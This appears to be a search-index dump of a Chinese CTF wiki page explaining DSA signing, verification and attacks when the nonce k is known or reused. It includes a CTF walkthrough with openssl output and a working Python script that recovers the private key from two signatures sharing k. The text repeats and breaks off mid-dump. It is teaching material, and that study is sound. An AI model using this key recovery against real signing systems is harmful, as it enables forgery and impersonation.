186-3\u7ed9\u51fa\u4e86\u4e00\u4e9b\u5efa\u8bae\u7684L\u548cN\u7684\u53d6\u503c\u4f8b\u5b50\uff1a(1024, 160)\uff0c (2048, 224)\uff0c (2048, 256)\uff0c\u4ee5\u53ca (3,072, 256)\u3002 \u9009\u62e9N\u6bd4\u7279\u7684\u7d20\u6570q\u3002 \u9009\u62e9L\u6bd4\u7279\u7684\u7d20\u6570p\uff0c\u4f7f\u5f97p-1\u662fq\u7684\u500d\u6570\u3002 \u9009\u62e9\u6ee1\u8db3 g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u7684g\uff0c\u5373\u5728\u6a21p\u7684\u80cc\u666f\u4e0b\uff0cord(g)=q\u7684g\u3002\u5373g\u5728\u6a21p\u7684\u610f\u4e49\u4e0b\uff0c\u5176\u6307\u6570\u6b21\u5e42\u53ef\u4ee5\u751f\u6210\u5177\u6709q\u4e2a\u5143\u7d20\u7684\u5b50\u7fa4\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97 g=h^{\\frac{p-1}{q}} \\bmod p g=h^{\\frac{p-1}{q}} \\bmod p \u6765\u5f97\u5230g\uff0c\u5176\u4e2d 1< h < p-1 1< h < p-1 \u3002 \u9009\u62e9\u79c1\u94a5x\uff0c 0<x<q 0<x<q \uff0c\u8ba1\u7b97 y \\equiv g^x \\bmod p y \\equiv g^x \\bmod p \u3002 \u516c\u94a5\u4e3a(p,q,g,y)\uff0c\u79c1\u94a5\u4e3a(x)\u3002 \u7b7e\u540d \u00b6 \u7b7e\u540d\u6b65\u9aa4\u5982\u4e0b \u9009\u62e9\u968f\u673a\u6574\u6570\u6570k\u4f5c\u4e3a\u4e34\u65f6\u5bc6\u94a5\uff0c 0<k<q 0<k<q \u3002 \u8ba1\u7b97 r\\equiv (g^k \\bmod p) \\bmod q r\\equiv (g^k \\bmod p) \\bmod q \u8ba1\u7b97 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u7b7e\u540d\u7ed3\u679c\u4e3a(r,s)\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u4e0eElgamal\u5f88\u91cd\u8981\u7684\u4e0d\u540c\u662f\u8fd9\u91cc\u4f7f\u7528\u4e86\u54c8\u5e0c\u51fd\u6570\u5bf9\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u5904\u7406\u3002 \u9a8c\u8bc1 \u00b6 \u9a8c\u8bc1\u8fc7\u7a0b\u5982\u4e0b \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c w=s^{-1} \\bmod q w=s^{-1} \\bmod q \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_1=H(m)w \\bmod q u_1=H(m)w \\bmod q \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_2=rw \\bmod q u_2=rw \\bmod q \u8ba1\u7b97 v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q \u5982\u679cv\u4e0er\u76f8\u7b49\uff0c\u5219\u6821\u9a8c\u6210\u529f\u3002 \u6b63\u786e\u6027\u63a8\u5bfc \u00b6 \u9996\u5148\uff0cg \u6ee1\u8db3 g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u3002\u6240\u4ee5 g^q \\equiv 1 \\bmod p g^q \\equiv 1 \\bmod p \u3002\u6240\u4ee5 g^x \\equiv g^{x \\bmod q} \\bmod p g^x \\equiv g^{x \\bmod q} \\bmod p \u3002\u8fdb\u800c v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} \u53c8 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u4e14 w=s^{-1} \\bmod q w=s^{-1} \\bmod q \u6240\u4ee5 k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q \u6240\u4ee5 v \\equiv g^k v \\equiv g^k \u3002\u6b63\u786e\u6027\u5f97\u8bc1\u3002 \u5b89\u5168\u6027 \u00b6 \u5df2\u77e5k \u00b6 \u539f\u7406 \u00b6 \u5982\u679c\u77e5\u9053\u4e86\u968f\u673a\u5bc6\u94a5k\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636e s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u8ba1\u7b97\u79c1\u94a5d\uff0c\u51e0\u4e4e\u653b\u7834\u4e86DSA\u3002 \u8fd9\u91cc\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u7684hash\u503c\u90fd\u4f1a\u7ed9\u51fa\u3002 x \\equiv r^{-1}(ks-H(m)) \\bmod q x \\equiv r^{-1}(ks-H(m)) \\bmod q k\u5171\u4eab \u00b6 \u539f\u7406 \u00b6 \u5982\u679c\u5728\u4e24\u6b21\u7b7e\u540d\u7684\u8fc7\u7a0b\u4e2d\u5171\u4eab\u4e86k\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002 \u5047\u8bbe\u7b7e\u540d\u7684\u6d88\u606f\u4e3am1,m2\uff0c\u663e\u7136\uff0c\u4e24\u8005\u7684r\u7684\u503c\u4e00\u6837\uff0c\u6b64\u5916 s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q \u8fd9\u91cc\u6211\u4eec\u9664\u4e86x\u548ck\u4e0d\u77e5\u9053\u5269\u4e0b\u7684\u5747\u77e5\u9053\uff0c\u90a3\u4e48 s_1k \\equiv H(m_1)+xr s_1k \\equiv H(m_1)+xr s_2k \\equiv H(m_2)+xr s_2k \\equiv H(m_2)+xr \u4e24\u5f0f\u76f8\u51cf k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q \u6b64\u65f6 \u5373\u53ef\u89e3\u51fak\uff0c\u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u89e3\u51fax\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5\u6e56\u6e58\u676f\u7684DSA\u4e3a\u4f8b\uff0c\u4f46\u662f\u4e0d\u80fd\u76f4\u63a5\u53bb\u505a\uff0c\uff0c\uff0c\u56e0\u4e3a\u53d1\u73b0\u5728\u9a8c\u8bc1message4\u7684\u65f6\u5019\u7b7e\u540d\u4e0d\u901a\u8fc7\u3002\u6e90\u9898\u76ee\u6211\u6ca1\u6709\u4e86\uff0c\u3002\uff0c\uff0c\u8fd9\u91cc\u6211\u4ee5Jarvis OJ\u4e2d\u7ecf\u8fc7\u4fee\u6539\u7684\u9898\u76eeDSA\u4e3a\u4f8b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin packet1/message1 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message1 packet2/message1: No such file or directory \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message2 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin packet3/message3 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin packet4/message4 Verified OK \u53ef\u4ee5\u770b\u51fa\u56db\u5219\u6d88\u606f\u5168\u90e8\u6821\u9a8c\u901a\u8fc7\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f1a\u8054\u60f3\u5230\u5171\u4eabk\u662f\u56e0\u4e3a\u9898\u76ee\u4e2d\u63d0\u793a\u4e86PS3\u7684\u7834\u89e3\u66fe\u7528\u5230\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4ece\u7f51\u4e0a\u641c\u7d22\u53ef\u77e5\u8be5\u653b\u51fb\u3002 \u4e0b\u9762\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u7b7e\u540d\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u547d\u4ee4\u5982\u4e0b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet4/sign4.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :5E10DED084203CCBCEC3356A2CA02FF318FD4123 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet3/sign3.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :30EB88E6A4BFB1B16728A974210AE4E41B42677D \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet2/sign2.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :60B9F2A5BA689B802942D667ED5D1EED066C5A7F 24 :d = 1 hl = 2 l = 20 prim: INTEGER :3DC8921BA26B514F4D991A85482750E0225A15B5 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet1/sign1.bin 0 :d = 0 hl = 2 l = 45 cons: SEQUENCE 2 :d = 1 hl = 2 l = 21 prim: INTEGER :8158B477C5AA033D650596E93653C730D26BA409 25 :d = 1 hl = 2 l = 20 prim: INTEGER :165B9DD1C93230C31111E5A4E6EB5181F990F702 \u5176\u4e2d\uff0c\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a\u503c\u662fr\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662fs\u3002\u53ef\u4ee5\u770b\u5230\u7b2c4\u4e2apacket\u548c\u7b2c3\u4e2apacket\u5171\u4eab\u4e86k\uff0c\u56e0\u4e3a\u4ed6\u4eec\u7684r\u4e00\u81f4\u3002 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528openssl\u770b\u4e0b\u516c\u94a5 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl dsa -in dsa_public.pem -text -noout -pubin read DSA key pub: 45 :bb:18:f6:0e:b0:51:f9:d4:82:18:df:8c:d9:56: 33 :0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83: 29 :2d:95:c4:df:c8:ac:26:ca:45:2e:17:0d:c7:9b: e1:5c:c6:15:9e:03:7b:cc:f5:64:ef:36:1c:18:c9: 9e:8a:eb:0b:c1:ac:f9:c0:c3:5d:62:0d:60:bb:73: 11 :f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a: 6f:ac:ce:86:65:90:06:d4:fa:f0:57:71:68:57:ec: 7c:a6:04:ad:e2:c3:d7:31:d6:d0:2f:93:31:98:d3: 90 :c3:ef:c3:f3:ff:04:6f P: 00 :c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31: 5e:e7:0c:a6:b5:b1:1a:51:9b:55:23:d4:0e:5b:a7: 45 :66:e2:2c:c8:8b:fe:c5:6a:ad:66:91:8b:9b:30: ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11: 84 :be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38: 3c:b4:a9:54:b3:7c:b5:88:67:2f:7c:09:57:b6:fd: f2:fa:05:38:fd:ad:83:93:4a:45:e4:f9:9d:38:de: 57 :c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1: 0c:e7:57:68:90:b6:ba:08:9b Q: 00 :86:8f:78:b8:c8:50:0b:eb:f6:7a:58:e3:3c:1f: 53 :9d:35:70:d1:bd G: 4c:d5:e6:b6:6a:6e:b7:e9:27:94:e3:61:1f:41:53: cb:11:af:5a:08:d9:d4:f8:a3:f2:50:03:72:91:ba: 5f:ff:3c:29:a8:c3:7b:c4:ee:5f:98:ec:17:f4:18: bc:71:61:01:6c:94:c8:49:02:e4:00:3a:79:87:f0: d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08: cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07: 9f:ea:12:09:8b:34:50:84:4a:2a:9e:5d:0a:99:bd: 86 :5e:05:70:d5:19:7d:f4:a1:c9:b8:01:8f:b9:9c: dc:e9:15:7b:98:50:01:79 \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e0a\u9762\u7684\u539f\u7406\u7f16\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u7a0b\u5e8f\u5982\u4e0b #coding=utf8 from Crypto.PublicKey import DSA from hashlib import sha1 import gmpy2 with open ( './dsa_public.pem' ) as f : key = DSA . importKey ( f ) y = key . y g = key . g p = key . p q = key . q f3 = open ( r \"packet3/message3\" , 'r' ) f4 = open ( r \"packet4/message4\" , 'r' ) data3 = f3 . read () data4 = f4 . read () sha = sha1 () sha . update ( data3 ) m3 = int ( sha . hexdigest (), 16 ) sha = sha1 () sha . update ( data4 ) m4 = int ( sha . hexdigest (), 16 ) print m3 , m4 s3 = 0x30EB88E6A4BFB1B16728A974210AE4E41B42677D s4 = 0x5E10DED084203CCBCEC3356A2CA02FF318FD4123 r = 0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC ds = s4 - s3 dm = m4 - m3 k = gmpy2 . mul ( dm , gmpy2 . invert ( ds , q )) k = gmpy2 . f_mod ( k , q ) tmp = gmpy2 . mul ( k , s3 ) - m3 x = tmp * gmpy2 . invert ( r , q ) x = gmpy2 . f_mod ( x , q ) print int ( x ) \u6211\u53d1\u73b0pip\u5b89\u88c5\u7684pycrypto\u7adf\u7136\u6ca1\u6709DSA\u7684importKey\u51fd\u6570\u3002\u3002\u3002\u53ea\u597d\u4ecegithub\u4e0a\u4e0b\u8f7d\u5b89\u88c5\u4e86pycrypto\u3002\u3002\u3002 \u7ed3\u679c\u5982\u4e0b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 python exp.py 1104884177962524221174509726811256177146235961550 943735132044536149000710760545778628181961840230 520793588153805320783422521615148687785086070744","title":"DSA"},{"location":"crypto/signature/dsa/#dsa","text":"\u4e0a\u9762\u6240\u63cf\u8ff0\u7684ElGamal\u7b7e\u540d\u7b97\u6cd5\u5728\u5b9e\u9645\u4e2d\u5e76\u4e0d\u5e38\u7528\uff0c\u66f4\u5e38\u7528\u7684\u662f\u5176\u53d8\u4f53DSA\u3002","title":"DSA"},{"location":"crypto/signature/dsa/#_1","text":"","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/signature/dsa/#_2","text":"\u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u76ee\u524d\u4e00\u822c\u9009\u62e9SHA1\uff0c\u5f53\u524d\u4e5f\u53ef\u4ee5\u9009\u62e9\u5f3a\u5ea6\u66f4\u9ad8\u7684\u54c8\u5e0c\u51fd\u6570H\u3002 \u9009\u62e9\u5bc6\u94a5\u7684\u957f\u5ea6L\u548cN\uff0c\u8fd9\u4e24\u4e2a\u503c\u51b3\u5b9a\u4e86\u7b7e\u540d\u7684\u5b89\u5168\u7a0b\u5ea6\u3002\u5728\u6700\u521d\u7684DSS\uff08 Digital Signature Standard \uff09\u4e2d\u5efa\u8baeL\u5fc5\u987b\u4e3a64\u7684\u500d\u6570\uff0c\u5e76\u4e14 512 \\leq L \\leq 1024 512 \\leq L \\leq 1024 \uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u66f4\u5927\u3002N\u5fc5\u987b\u5927\u5c0f\u5fc5\u987b\u4e0d\u5927\u4e8e\u54c8\u5e0c\u51fd\u6570H\u8f93\u51fa\u7684\u957f\u5ea6\u3002FIPS 186-3\u7ed9\u51fa\u4e86\u4e00\u4e9b\u5efa\u8bae\u7684L\u548cN\u7684\u53d6\u503c\u4f8b\u5b50\uff1a(1024, 160)\uff0c (2048, 224)\uff0c (2048, 256)\uff0c\u4ee5\u53ca (3,072, 256)\u3002 \u9009\u62e9N\u6bd4\u7279\u7684\u7d20\u6570q\u3002 \u9009\u62e9L\u6bd4\u7279\u7684\u7d20\u6570p\uff0c\u4f7f\u5f97p-1\u662fq\u7684\u500d\u6570\u3002 \u9009\u62e9\u6ee1\u8db3 g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u7684g\uff0c\u5373\u5728\u6a21p\u7684\u80cc\u666f\u4e0b\uff0cord(g)=q\u7684g\u3002\u5373g\u5728\u6a21p\u7684\u610f\u4e49\u4e0b\uff0c\u5176\u6307\u6570\u6b21\u5e42\u53ef\u4ee5\u751f\u6210\u5177\u6709q\u4e2a\u5143\u7d20\u7684\u5b50\u7fa4\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97 g=h^{\\frac{p-1}{q}} \\bmod p g=h^{\\frac{p-1}{q}} \\bmod p \u6765\u5f97\u5230g\uff0c\u5176\u4e2d 1< h < p-1 1< h < p-1 \u3002 \u9009\u62e9\u79c1\u94a5x\uff0c 0<x<q 0<x<q \uff0c\u8ba1\u7b97 y \\equiv g^x \\bmod p y \\equiv g^x \\bmod p \u3002 \u516c\u94a5\u4e3a(p,q,g,y)\uff0c\u79c1\u94a5\u4e3a(x)\u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/signature/dsa/#_3","text":"\u7b7e\u540d\u6b65\u9aa4\u5982\u4e0b \u9009\u62e9\u968f\u673a\u6574\u6570\u6570k\u4f5c\u4e3a\u4e34\u65f6\u5bc6\u94a5\uff0c 0<k<q 0<k<q \u3002 \u8ba1\u7b97 r\\equiv (g^k \\bmod p) \\bmod q r\\equiv (g^k \\bmod p) \\bmod q \u8ba1\u7b97 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u7b7e\u540d\u7ed3\u679c\u4e3a(r,s)\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u4e0eElgamal\u5f88\u91cd\u8981\u7684\u4e0d\u540c\u662f\u8fd9\u91cc\u4f7f\u7528\u4e86\u54c8\u5e0c\u51fd\u6570\u5bf9\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u5904\u7406\u3002","title":"\u7b7e\u540d"},{"location":"crypto/signature/dsa/#_4","text":"\u9a8c\u8bc1\u8fc7\u7a0b\u5982\u4e0b \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c w=s^{-1} \\bmod q w=s^{-1} \\bmod q \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_1=H(m)w \\bmod q u_1=H(m)w \\bmod q \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_2=rw \\bmod q u_2=rw \\bmod q \u8ba1\u7b97 v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q \u5982\u679cv\u4e0er\u76f8\u7b49\uff0c\u5219\u6821\u9a8c\u6210\u529f\u3002","title":"\u9a8c\u8bc1"},{"location":"crypto/signature/dsa/#_5","text":"\u9996\u5148\uff0cg \u6ee1\u8db3 g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u3002\u6240\u4ee5 g^q \\equiv 1 \\bmod p g^q \\equiv 1 \\bmod p \u3002\u6240\u4ee5 g^x \\equiv g^{x \\bmod q} \\bmod p g^x \\equiv g^{x \\bmod q} \\bmod p \u3002\u8fdb\u800c v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} \u53c8 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u4e14 w=s^{-1} \\bmod q w=s^{-1} \\bmod q \u6240\u4ee5 k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q \u6240\u4ee5 v \\equiv g^k v \\equiv g^k \u3002\u6b63\u786e\u6027\u5f97\u8bc1\u3002","title":"\u6b63\u786e\u6027\u63a8\u5bfc"},{"location":"crypto/signature/dsa/#_6","text":"","title":"\u5b89\u5168\u6027"},{"location":"crypto/signature/dsa/#k","text":"","title":"\u5df2\u77e5k"},{"location":"crypto/signature/dsa/#_7","text":"\u5982\u679c\u77e5\u9053\u4e86\u968f\u673a\u5bc6\u94a5k\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636e s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u8ba1\u7b97\u79c1\u94a5d\uff0c\u51e0\u4e4e\u653b\u7834\u4e86DSA\u3002 \u8fd9\u91cc\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u7684hash\u503c\u90fd\u4f1a\u7ed9\u51fa\u3002 x \\equiv r^{-1}(ks-H(m)) \\bmod q x \\equiv r^{-1}(ks-H(m)) \\bmod q","title":"\u539f\u7406"},{"location":"crypto/signature/dsa/#k_1","text":"","title":"k\u5171\u4eab"},{"location":"crypto/signature/dsa/#_8","text":"\u5982\u679c\u5728\u4e24\u6b21\u7b7e\u540d\u7684\u8fc7\u7a0b\u4e2d\u5171\u4eab\u4e86k\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002 \u5047\u8bbe\u7b7e\u540d\u7684\u6d88\u606f\u4e3am1,m2\uff0c\u663e\u7136\uff0c\u4e24\u8005\u7684r\u7684\u503c\u4e00\u6837\uff0c\u6b64\u5916 s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q \u8fd9\u91cc\u6211\u4eec\u9664\u4e86x\u548ck\u4e0d\u77e5\u9053\u5269\u4e0b\u7684\u5747\u77e5\u9053\uff0c\u90a3\u4e48 s_1k \\equiv H(m_1)+xr s_1k \\equiv H(m_1)+xr s_2k \\equiv H(m_2)+xr s_2k \\equiv H(m_2)+xr \u4e24\u5f0f\u76f8\u51cf k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q \u6b64\u65f6 \u5373\u53ef\u89e3\u51fak\uff0c\u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u89e3\u51fax\u3002","title":"\u539f\u7406"},{"location":"crypto/signature/dsa/#_9","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5\u6e56\u6e58\u676f\u7684DSA\u4e3a\u4f8b\uff0c\u4f46\u662f\u4e0d\u80fd\u76f4\u63a5\u53bb\u505a\uff0c\uff0c\uff0c\u56e0\u4e3a\u53d1\u73b0\u5728\u9a8c\u8bc1message4\u7684\u65f6\u5019\u7b7e\u540d\u4e0d\u901a\u8fc7\u3002\u6e90\u9898\u76ee\u6211\u6ca1\u6709\u4e86\uff0c\u3002\uff0c\uff0c\u8fd9\u91cc\u6211\u4ee5Jarvis OJ\u4e2d\u7ecf\u8fc7\u4fee\u6539\u7684\u9898\u76eeDSA\u4e3a\u4f8b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin packet1/message1 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message1 packet2/message1: No such file or directory \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message2 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin packet3/message3 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin packet4/message4 Verified OK \u53ef\u4ee5\u770b\u51fa\u56db\u5219\u6d88\u606f\u5168\u90e8\u6821\u9a8c\u901a\u8fc7\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f1a\u8054\u60f3\u5230\u5171\u4eabk\u662f\u56e0\u4e3a\u9898\u76ee\u4e2d\u63d0\u793a\u4e86PS3\u7684\u7834\u89e3\u66fe\u7528\u5230\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4ece\u7f51\u4e0a\u641c\u7d22\u53ef\u77e5\u8be5\u653b\u51fb\u3002 \u4e0b\u9762\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u7b7e\u540d\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u547d\u4ee4\u5982\u4e0b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet4/sign4.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :5E10DED084203CCBCEC3356A2CA02FF318FD4123 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet3/sign3.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :30EB88E6A4BFB1B16728A974210AE4E41B42677D \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet2/sign2.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :60B9F2A5BA689B802942D667ED5D1EED066C5A7F 24 :d = 1 hl = 2 l = 20 prim: INTEGER :3DC8921BA26B514F4D991A85482750E0225A15B5 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet1/sign1.bin 0 :d = 0 hl = 2 l = 45 cons: SEQUENCE 2 :d = 1 hl = 2 l = 21 prim: INTEGER :8158B477C5AA033D650596E93653C730D26BA409 25 :d = 1 hl = 2 l = 20 prim: INTEGER :165B9DD1C93230C31111E5A4E6EB5181F990F702 \u5176\u4e2d\uff0c\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a\u503c\u662fr\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662fs\u3002\u53ef\u4ee5\u770b\u5230\u7b2c4\u4e2apacket\u548c\u7b2c3\u4e2apacket\u5171\u4eab\u4e86k\uff0c\u56e0\u4e3a\u4ed6\u4eec\u7684r\u4e00\u81f4\u3002 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528openssl\u770b\u4e0b\u516c\u94a5 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl dsa -in dsa_public.pem -text -noout -pubin read DSA key pub: 45 :bb:18:f6:0e:b0:51:f9:d4:82:18:df:8c:d9:56: 33 :0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83: 29 :2d:95:c4:df:c8:ac:26:ca:45:2e:17:0d:c7:9b: e1:5c:c6:15:9e:03:7b:cc:f5:64:ef:36:1c:18:c9: 9e:8a:eb:0b:c1:ac:f9:c0:c3:5d:62:0d:60:bb:73: 11 :f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a: 6f:ac:ce:86:65:90:06:d4:fa:f0:57:71:68:57:ec: 7c:a6:04:ad:e2:c3:d7:31:d6:d0:2f:93:31:98:d3: 90 :c3:ef:c3:f3:ff:04:6f P: 00 :c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31: 5e:e7:0c:a6:b5:b1:1a:51:9b:55:23:d4:0e:5b:a7: 45 :66:e2:2c:c8:8b:fe:c5:6a:ad:66:91:8b:9b:30: 